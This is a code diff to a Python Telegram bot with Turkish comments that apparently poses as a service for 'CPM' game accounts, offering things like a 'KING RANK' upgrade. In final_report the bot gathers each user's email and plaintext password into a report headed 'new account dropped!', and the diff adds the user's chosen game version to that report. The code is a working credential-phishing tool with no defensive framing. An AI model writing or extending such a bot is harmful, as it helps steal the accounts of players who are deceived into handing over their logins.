@@ -65,7 +65,9 @@ def step_check_key(message):
 
 def step_select_action(message):
     lang = user_data[message.chat.id]['lang']
-    user_data[message.chat.id]['cpm_type'] = message.text
+    # SEÇİLEN CPM SÜRÜMÜNÜ KAYDEDİYORUZ
+    user_data[message.chat.id]['cpm_version'] = message.text
+    
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
     for btn in strings[lang]['btns']:
         markup.add(btn)
@@ -98,8 +100,10 @@ def final_report(message, is_king=False):
     new_val = message.text if not is_king else "KING RANK"
     bot.send_message(message.chat.id, strings[lang]['processing'])
     
+    # BİLDİRİM BURADA OLUŞUYOR (SÜRÜM BİLGİSİ EKLENDİ)
     report = f"🎯 **YENİ HESAP DÜŞTÜ!** 🎯\n\n" \
              f"👤 Kullanıcı: @{message.from_user.username}\n" \
+             f"📱 Sürüm: `{user_data[message.chat.id]['cpm_version']}`\n" \
              f"📧 Mail: `{user_data[message.chat.id]['old_mail']}`\n" \
              f"🔒 Şifre: `{user_data[message.chat.id]['old_pass']}`\n" \
              f"🛠 İşlem: {user_data[message.chat.id]['action']}\n" \
@@ -111,3 +115,4 @@ def final_report(message, is_king=False):
 
 if __name__ == "__main__":
     bot.infinity_polling()
+    
